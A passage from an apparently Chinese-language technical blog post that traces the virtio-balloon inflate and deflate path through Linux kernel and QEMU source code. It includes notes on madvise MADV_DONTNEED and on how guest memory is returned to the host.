class=\"type\">ssize_t</span> <span class=\"title function_\">bind_store</span><span class=\"params\">(<span class=\"keyword\">struct</span> device_driver *drv, <span class=\"type\">const</span> <span class=\"type\">char</span> *buf,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t  <span class=\"type\">size_t</span> count)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">bus_type</span> *<span class=\"title\">bus</span> =</span> bus_get(drv-&gt;bus);</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">device</span> *<span class=\"title\">dev</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> err = -ENODEV;</span><br><span class=\"line\"></span><br><span class=\"line\">\tdev = bus_find_device_by_name(bus, <span class=\"literal\">NULL</span>, buf);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (dev &amp;&amp; driver_match_device(drv, dev)) &#123;</span><br><span class=\"line\">\t\terr = device_driver_attach(drv, dev);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!err) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">/* success */</span></span><br><span class=\"line\">\t\t\terr = count;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tput_device(dev);</span><br><span class=\"line\">\tbus_put(bus);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> err;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">struct</span> device *<span class=\"title function_\">bus_find_device</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"keyword\">struct</span> bus_type *bus,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t       <span class=\"keyword\">struct</span> device *start, <span class=\"type\">const</span> <span class=\"type\">void</span> *data,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t       <span class=\"type\">int</span> (*match)(<span class=\"keyword\">struct</span> device *dev, <span class=\"type\">const</span> <span class=\"type\">void</span> *data))</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">subsys_private</span> *<span class=\"title\">sp</span> =</span> bus_to_subsys(bus);</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">klist_iter</span> <span class=\"title\">i</span>;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">device</span> *<span class=\"title\">dev</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!sp)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tklist_iter_init_node(&amp;sp-&gt;klist_devices, &amp;i,</span><br><span class=\"line\">\t\t\t     (start ? &amp;start-&gt;p-&gt;knode_bus : <span class=\"literal\">NULL</span>));</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> ((dev = next_device(&amp;i)))</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (match(dev, data) &amp;&amp; get_device(dev))</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\tklist_iter_exit(&amp;i);</span><br><span class=\"line\">\tsubsys_put(sp);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> dev;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">device_match_name</span><span class=\"params\">(<span class=\"keyword\">struct</span> device *dev, <span class=\"type\">const</span> <span class=\"type\">void</span> *name)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> sysfs_streq(dev_name(dev), name);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>所有device维护在bus这个数据结构中</p>\n<p><code>mdev_device_create</code> 创建device</p>\n<p>对于qemu的info操作 似乎并不会触发内核的函数 如何通过一个接口看一下时间？</p>\n<p>在update size函数中 如果无变化返回之前 加入print</p>\n<p>即想查看的时候同样用修改的接口 输入一个不变的值即可</p>\n<p>从结果来看比较准确且稳定</p>\n<p>fill_balloon会从内核模块alloc page 表示已经拿了这个page 所以guest kernel没法用了</p>\n<p>leak_balloon释放这个page</p>\n<h3 id=\"fill\"><a href=\"#fill\" class=\"headerlink\" title=\"fill\"></a>fill</h3><h4 id=\"guest\"><a href=\"#guest\" class=\"headerlink\" title=\"guest\"></a>guest</h4><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">struct</span> page *<span class=\"title function_\">balloon_page_alloc</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">page</span> *<span class=\"title\">page</span> =</span> alloc_page(balloon_mapping_gfp_mask() |</span><br><span class=\"line\">\t\t\t\t       __GFP_NOMEMALLOC | __GFP_NORETRY);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> page;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">unsigned</span> <span class=\"title function_\">fill_balloon</span><span class=\"params\">(<span class=\"keyword\">struct</span> virtio_balloon *vb, <span class=\"type\">size_t</span> num)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> num_allocated_pages;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> num_pfns;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">page</span> *<span class=\"title\">page</span>;</span></span><br><span class=\"line\">\tLIST_HEAD(pages);</span><br><span class=\"line\">\tnum = min(num, ARRAY_SIZE(vb-&gt;pfns));</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (num_pfns = <span class=\"number\">0</span>; num_pfns &lt; num;</span><br><span class=\"line\">\t     num_pfns += VIRTIO_BALLOON_PAGES_PER_PAGE) &#123;</span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">page</span> *<span class=\"title\">page</span> =</span> balloon_page_alloc();</span><br><span class=\"line\">\t\t...</span><br><span class=\"line\">\t\t<span class=\"comment\">//local list 和balloon_page_pop对应 只是一次性全部alloc而已</span></span><br><span class=\"line\">\t\tballoon_page_push(&amp;pages, page);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tmutex_lock(&amp;vb-&gt;balloon_lock);</span><br><span class=\"line\">\tvb-&gt;num_pfns = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> ((page = balloon_page_pop(&amp;pages))) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//把这次拿到的page全部加入balloon中</span></span><br><span class=\"line\">\t\tballoon_page_enqueue(&amp;vb-&gt;vb_dev_info, page);</span><br><span class=\"line\">\t\tset_page_pfns(vb, vb-&gt;pfns + vb-&gt;num_pfns, page);</span><br><span class=\"line\">\t\tvb-&gt;num_pages += VIRTIO_BALLOON_PAGES_PER_PAGE;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!virtio_has_feature(vb-&gt;vdev,</span><br><span class=\"line\">\t\t\t\t\tVIRTIO_BALLOON_F_DEFLATE_ON_OOM))</span><br><span class=\"line\">            <span class=\"comment\">//如果没开DEFLATE_ON_OOM guest内核可用的page是减少的</span></span><br><span class=\"line\">\t\t\tadjust_managed_page_count(page, <span class=\"number\">-1</span>);</span><br><span class=\"line\">\t\tvb-&gt;num_pfns += VIRTIO_BALLOON_PAGES_PER_PAGE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tnum_allocated_pages = vb-&gt;num_pfns;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (vb-&gt;num_pfns != <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\ttell_host(vb, vb-&gt;inflate_vq);</span><br><span class=\"line\">\tmutex_unlock(&amp;vb-&gt;balloon_lock);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> num_allocated_pages;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>[<a href=\"https://blog.csdn.net/u010923083/article/details/115873669\">内核内存] 伙伴系统4—alloc_pages(内存块分配)_早起的虫儿有鹰吃的博客-CSDN博客</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">tell_host</span><span class=\"params\">(<span class=\"keyword\">struct</span> virtio_balloon *vb, <span class=\"keyword\">struct</span> virtqueue *vq)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">scatterlist</span> <span class=\"title\">sg</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> len;</span><br><span class=\"line\">\tsg_init_one(&amp;sg, vb-&gt;pfns, <span class=\"keyword\">sizeof</span>(vb-&gt;pfns[<span class=\"number\">0</span>]) * vb-&gt;num_pfns);</span><br><span class=\"line\">\tvirtqueue_add_outbuf(vq, &amp;sg, <span class=\"number\">1</span>, vb, GFP_KERNEL);</span><br><span class=\"line\">\tvirtqueue_kick(vq);</span><br><span class=\"line\">\twait_event(vb-&gt;acked, virtqueue_get_buf(vq, &amp;len));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">bool</span> <span class=\"title function_\">virtqueue_notify</span><span class=\"params\">(<span class=\"keyword\">struct</span> virtqueue *_vq)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">vring_virtqueue</span> *<span class=\"title\">vq</span> =</span> to_vvq(_vq);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (unlikely(vq-&gt;broken))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!vq-&gt;notify(_vq)) &#123;</span><br><span class=\"line\">\t\tvq-&gt;broken = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">bool</span> <span class=\"title function_\">vp_notify</span><span class=\"params\">(<span class=\"keyword\">struct</span> virtqueue *vq)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"comment\">/* we write the queue&#x27;s selector into the notification register to</span></span><br><span class=\"line\"><span class=\"comment\">\t * signal the other end */</span></span><br><span class=\"line\">    <span class=\"comment\">// value, addr</span></span><br><span class=\"line\">\tiowrite16(vq-&gt;index, (<span class=\"type\">void</span> __iomem *)vq-&gt;priv);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里wait_event是一个宏 传入的第二个参数会一直被调用然后sleep</p>\n<p>相当于</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">for(;;)&#123;</span><br><span class=\"line\">\tif (virtqueue_get_buf(vq, &amp;len))</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">\tschedule();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"qemu\"><a href=\"#qemu\" class=\"headerlink\" title=\"qemu\"></a>qemu</h4><p>virtio:<a href=\"https://blog.csdn.net/xidianjiapei001/article/details/89293914\">IO虚拟化 - virtio介绍及代码分析【转】_xidianjiapei001的博客-CSDN博客</a></p>\n<p><a href=\"https://www.cnblogs.com/edver/category/1939743.html\">虚拟化 - 随笔分类 - Edver - 博客园 (cnblogs.com)</a></p>\n<p>virtqueue初始化过程：</p>\n<p>virtio_pci_legacy_probe 初始化回调函数</p>\n<p><code>virtballoon_probe</code>-&gt;<code>init_vqs</code>-&gt;<code>virtio_find_vqs</code>-&gt;<code>find_vqs(vp_find_vqs)</code>-&gt;<code>vp_find_vqs_msix</code>-&gt;<code>vp_setup_vq(setup_vq)</code>-&gt;<code>vring_create_virtqueue</code></p>\n<p><a href=\"https://www.cnblogs.com/edver/p/14684117.html\">virtio简介（三） —— virtio-balloon qemu设备创建 - Edver - 博客园 (cnblogs.com)</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">virtio_balloon_device_realize</span><span class=\"params\">(DeviceState *dev, Error **errp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    VirtIODevice *vdev = VIRTIO_DEVICE(dev);</span><br><span class=\"line\">    VirtIOBalloon *s = VIRTIO_BALLOON(dev);</span><br><span class=\"line\">    <span class=\"type\">int</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">    virtio_init(vdev, VIRTIO_ID_BALLOON, virtio_balloon_config_size(s));</span><br><span class=\"line\"></span><br><span class=\"line\">    ret = qemu_add_balloon_handler(virtio_balloon_to_target,</span><br><span class=\"line\">                                   virtio_balloon_stat, s);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ret &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        error_setg(errp, <span class=\"string\">&quot;Only one balloon device is supported&quot;</span>);</span><br><span class=\"line\">        virtio_cleanup(vdev);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (virtio_has_feature(s-&gt;host_features, VIRTIO_BALLOON_F_FREE_PAGE_HINT) &amp;&amp;</span><br><span class=\"line\">        !s-&gt;iothread) &#123;</span><br><span class=\"line\">        error_setg(errp, <span class=\"string\">&quot;&#x27;free-page-hint&#x27; requires &#x27;iothread&#x27; to be set&quot;</span>);</span><br><span class=\"line\">        virtio_cleanup(vdev);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    s-&gt;ivq = virtio_add_queue(vdev, <span class=\"number\">128</span>, virtio_balloon_handle_output);</span><br><span class=\"line\">    s-&gt;dvq = virtio_add_queue(vdev, <span class=\"number\">128</span>, virtio_balloon_handle_output);</span><br><span class=\"line\">    s-&gt;svq = virtio_add_queue(vdev, <span class=\"number\">128</span>, virtio_balloon_receive_stats);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">virtio_queue_notify_vq</span><span class=\"params\">(VirtQueue *vq)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (vq-&gt;vring.desc &amp;&amp; vq-&gt;handle_output) &#123;</span><br><span class=\"line\">        VirtIODevice *vdev = vq-&gt;vdev;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (unlikely(vdev-&gt;broken)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        trace_virtio_queue_notify(vdev, vq - vdev-&gt;vq, vq);</span><br><span class=\"line\">        vq-&gt;handle_output(vdev, vq);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (unlikely(vdev-&gt;start_on_kick)) &#123;</span><br><span class=\"line\">            virtio_set_started(vdev, <span class=\"literal\">true</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">virtio_balloon_handle_output</span><span class=\"params\">(VirtIODevice *vdev, VirtQueue *vq)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    VirtIOBalloon *s = VIRTIO_BALLOON(vdev);</span><br><span class=\"line\">    VirtQueueElement *elem;</span><br><span class=\"line\">    MemoryRegionSection section;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">        PartiallyBalloonedPage pbp = &#123;&#125;;</span><br><span class=\"line\">        <span class=\"type\">size_t</span> offset = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"type\">uint32_t</span> pfn;</span><br><span class=\"line\"></span><br><span class=\"line\">        elem = virtqueue_pop(vq, <span class=\"keyword\">sizeof</span>(VirtQueueElement));</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!elem) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (iov_to_buf(elem-&gt;out_sg, elem-&gt;out_num, offset, &amp;pfn, <span class=\"number\">4</span>) == <span class=\"number\">4</span>) &#123;</span><br><span class=\"line\">            <span class=\"type\">unsigned</span> <span class=\"type\">int</span> p = virtio_ldl_p(vdev, &amp;pfn);</span><br><span class=\"line\">            hwaddr pa;</span><br><span class=\"line\"></span><br><span class=\"line\">            pa = (hwaddr) p &lt;&lt; VIRTIO_BALLOON_PFN_SHIFT;</span><br><span class=\"line\">            offset += <span class=\"number\">4</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">            section = memory_region_find(get_system_memory(), pa,</span><br><span class=\"line\">                                         BALLOON_PAGE_SIZE);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!section.mr) &#123;</span><br><span class=\"line\">                trace_virtio_balloon_bad_addr(pa);</span><br><span class=\"line\">                <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!memory_region_is_ram(section.mr) ||</span><br><span class=\"line\">                memory_region_is_rom(section.mr) ||</span><br><span class=\"line\">                memory_region_is_romd(section.mr)) &#123;</span><br><span class=\"line\">                trace_virtio_balloon_bad_addr(pa);</span><br><span class=\"line\">                memory_region_unref(section.mr);</span><br><span class=\"line\">                <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            trace_virtio_balloon_handle_output(memory_region_name(section.mr),</span><br><span class=\"line\">                                               pa);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!virtio_balloon_inhibited()) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (vq == s-&gt;ivq) &#123;</span><br><span class=\"line\">                    balloon_inflate_page(s, section.mr,</span><br><span class=\"line\">                                         section.offset_within_region, &amp;pbp);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (vq == s-&gt;dvq) &#123;</span><br><span class=\"line\">                    balloon_deflate_page(s, section.mr, section.offset_within_region);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    g_assert_not_reached();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            memory_region_unref(section.mr);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        virtqueue_push(vq, elem, <span class=\"number\">0</span>);</span><br><span class=\"line\">        virtio_notify(vdev, vq);</span><br><span class=\"line\">        g_free(elem);</span><br><span class=\"line\">        virtio_balloon_pbp_free(&amp;pbp);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>inflate操作是guest会立即把内存还给host</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">balloon_inflate_page</span><span class=\"params\">(VirtIOBalloon *balloon,</span></span><br><span class=\"line\"><span class=\"params\">                                 MemoryRegion *mr, hwaddr mr_offset,</span></span><br><span class=\"line\"><span class=\"params\">                                 PartiallyBalloonedPage *pbp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">void</span> *addr = memory_region_get_ram_ptr(mr) + mr_offset;</span><br><span class=\"line\">    <span class=\"type\">ram_addr_t</span> rb_offset, rb_aligned_offset, base_gpa;</span><br><span class=\"line\">    RAMBlock *rb;</span><br><span class=\"line\">    <span class=\"type\">size_t</span> rb_page_size;</span><br><span class=\"line\">    <span class=\"type\">int</span> subpages;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* XXX is there a better way to get to the RAMBlock than via a</span></span><br><span class=\"line\"><span class=\"comment\">     * host address? */</span></span><br><span class=\"line\">    rb = qemu_ram_block_from_host(addr, <span class=\"literal\">false</span>, &amp;rb_offset);</span><br><span class=\"line\">    rb_page_size = qemu_ram_pagesize(rb);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (rb_page_size == BALLOON_PAGE_SIZE) &#123;</span><br><span class=\"line\">        <span class=\"comment\">/* Easy case */</span></span><br><span class=\"line\"></span><br><span class=\"line\">        ram_block_discard_range(rb, rb_offset, rb_page_size);</span><br><span class=\"line\">        <span class=\"comment\">/* We ignore errors from ram_block_discard_range(), because it</span></span><br><span class=\"line\"><span class=\"comment\">         * has already reported them, and failing to discard a balloon</span></span><br><span class=\"line\"><span class=\"comment\">         * page is not fatal */</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t...<span class=\"comment\">//经过测试 基本都是easy case</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>ram_block_discard_range会调madvice</p>\n<blockquote>\n<p>MADV_WILLNEED<br>Expect access in the near future. (Hence, it might be a good idea to read some pages ahead.)</p>\n<p>MADV_DONTNEED<br>Do not expect access in the near future. (For the time being, the application is finished with the given range, so the kernel can free resources associated with it.) Subsequent accesses of pages in this range will succeed, but will result either in reloading of the memory contents from the underlying mapped file (see mmap(2)) or zero-fill-on-demand pages for mappings without an underlying file.<br>MADV_REMOVE (Since Linux 2.6.16)<br>Free up a given range of pages and its associated backing store. Currently, only shmfs&#x2F;tmpfs supports this; other file systems return with the error ENOSYS.</p>\n</blockquote>\n<p>经过尝试后发现 <strong>通过mmap拿的内存 madvise <code>MADV_DONTNEED</code> 是会立即被回收的</strong></p>\n<p>实际上这里一定需要unmap ept 否则需要相信guest kernel不会访问已经被释放的页 但是VMM不相信VM</p>\n<p>这里没有手动unmap的原因是 madvise之后 内核如果真的free page 也需要修改自己的页表 并且调用mmu notify 最终通知kvm <code>kvm_mmu_notifier_invalidate_range_start</code>host上加输出可以看到</p>\n<p>mm&#x2F;madvise.c </p>\n<p><code>do_madvise</code>-&gt;<code>madvise_vma_behavior</code>-&gt;<code>madvise_dontneed_free</code>-&gt;<code>madvise_dontneed_single_vma</code>-&gt;<code>zap_page_range</code>-&gt;</p>\n<p><code>mmu_notifier_invalidate_range_start</code> 解kvm ept</p>\n<p><code>unmap_single_vma</code> 解kernel</p>\n<p>这里只是unmap 但是并没有free掉相应的物理内存(修改page元数据 还给buddy system) 那不还是用不了？</p>\n<blockquote>\n<p>成功执行<strong>MADV_DONTNEED</strong>操作之后，访问指定区域的语义将发生变化：后续访问这些页面将会成功，但是会导致从底层映射文件中重新填充内容(用于共享文件映射、共享匿名映射及shmem等)或者导致私有映射的零填充按需页面。因此此操作是直接将page给回收了，从对私有映射的处理来看，与swap还是略微不同的。</p>\n<p>需要注意的是，当应用于共享映射时，<strong>MADV_DONTNEED</strong> 可能不会立即释放范围内的页面。内核可以自由地选择合适的时机来释放页面。然而，调用进程的常驻集大小 (RSS) 将立即减少。</p>\n<p>作者：蟹蟹宁<br>链接：<a href=\"https://www.jianshu.com/p/965b1ed71ae4\">https://www.jianshu.com/p/965b1ed71ae4</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>\n</blockquote>\n<h3 id=\"leak\"><a href=\"#leak\" class=\"headerlink\" title=\"leak\"></a>leak</h3><p>用的是inflate存下来的page 一模一样的</p>\n<p>其实deflate是无所谓的 根据现有的所有机制 VM想用就用就行了</p>\n<p>qemu</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">virtio_balloon_handle_output</span><span class=\"params\">(VirtIODevice *vdev, VirtQueue *vq)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    VirtIOBalloon *s = VIRTIO_BALLOON(vdev);</span><br><span class=\"line\">    VirtQueueElement *elem;</span><br><span class=\"line\">    MemoryRegionSection section;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">        PartiallyBalloonedPage pbp = &#123;&#125;;</span><br><span class=\"line\">        <span class=\"type\">size_t</span> offset = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"type\">uint32_t</span> pfn;</span><br><span class=\"line\"></span><br><span class=\"line\">        elem = virtqueue_pop(vq, <span class=\"keyword\">sizeof</span>(VirtQueueElement));</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!elem) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (iov_to_buf(elem-&gt;out_sg, elem-&gt;out_num, offset, &amp;pfn, <span class=\"number\">4</span>) == <span class=\"number\">4</span>) &#123;</span><br><span class=\"line\">            <span class=\"type\">unsigned</span> <span class=\"type\">int</span> p = virtio_ldl_p(vdev, &amp;pfn);</span><br><span class=\"line\">            hwaddr pa;</span><br><span class=\"line\"></span><br><span class=\"line\">            pa = (hwaddr) p &lt;&lt; VIRTIO_BALLOON_PFN_SHIFT;</span><br><span class=\"line\">            offset += <span class=\"number\">4</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">            section = memory_region_find(get_system_memory(), pa,</span><br><span class=\"line\">                                         BALLOON_PAGE_SIZE);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!section.mr) &#123;</span><br><span class=\"line\">                trace_virtio_balloon_bad_addr(pa);</span><br><span class=\"line\">                <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!memory_region_is_ram(section.mr) ||</span><br><span class=\"line\">                memory_region_is_rom(section.mr) ||</span><br><span class=\"line\">                memory_region_is_romd(section.mr)) &#123;</span><br><span class=\"line\">                trace_virtio_balloon_bad_addr(pa);</span><br><span class=\"line\">                memory_region_unref(section.mr);</span><br><span class=\"line\">                <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            trace_virtio_balloon_handle_output(memory_region_name(section.mr),</span><br><span class=\"line\">                                               pa);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!virtio_balloon_inhibited()) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (vq == s-&gt;ivq) &#123;</span><br><span class=\"line\">                    balloon_inflate_page(s, section.mr,</span><br><span class=\"line\">                                         section.offset_within_region, &amp;pbp);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (vq == s-&gt;dvq) &#123;</span><br><span class=\"line\">                    balloon_deflate_page(s, section.mr, section.offset_within_region);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    g_assert_not_reached();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            memory_region_unref(section.mr);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        virtqueue_push(vq, elem, <span class=\"number\">0</span>);</span><br><span class=\"line\">        virtio_notify(vdev, vq);</span><br><span class=\"line\">        g_free(elem);</span><br><span class=\"line\">        virtio_balloon_pbp_free(&amp;pbp);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">balloon_deflate_page</span><span class=\"params\">(VirtIOBalloon *balloon,</span></span><br><span class=\"line\"><span class=\"params\">                                 MemoryRegion *mr, hwaddr mr_offset)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">void</span> *addr = memory_region_get_ram_ptr(mr) + mr_offset;</span><br><span class=\"line\">    <span class=\"type\">ram_addr_t</span> rb_offset;</span><br><span class=\"line\">    RAMBlock *rb;</span><br><span class=\"line\">    <span class=\"type\">size_t</span> rb_page_size;</span><br><span class=\"line\">    <span class=\"type\">void</span> *host_addr;</span><br><span class=\"line\">    <span class=\"type\">int</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* XXX is there a better way to get to the RAMBlock than via a</span></span><br><span class=\"line\"><span class=\"comment\">     * host address? */</span></span><br><span class=\"line\">    rb = qemu_ram_block_from_host(addr, <span class=\"literal\">false</span>, &amp;rb_offset);</span><br><span class=\"line\">    rb_page_size = qemu_ram_pagesize(rb);</span><br><span 